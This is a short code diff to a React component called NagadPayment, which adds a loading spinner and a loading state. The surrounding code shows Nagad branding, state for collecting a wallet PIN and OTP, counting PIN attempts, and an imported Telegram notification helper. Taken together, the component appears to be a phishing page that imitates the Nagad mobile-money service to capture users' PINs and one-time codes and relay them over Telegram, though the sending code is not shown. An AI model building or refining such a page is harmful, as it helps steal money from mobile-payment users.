@@ -2,6 +2,7 @@ import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
+import DualCircleLoader from "@/components/DualCircleLoader";
 import cartIcon from "@/assets/cart-icon.png";
 import nagadLogoWhite from "@/assets/nagad-logo-white.png";
 
@@ -21,6 +22,7 @@ const NagadPayment = () => {
   const [pinError, setPinError] = useState("");
   const [pinAttempts, setPinAttempts] = useState(0);
   const [otpResent, setOtpResent] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
 
   const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const otpInputRef = useRef<HTMLInputElement | null>(null);
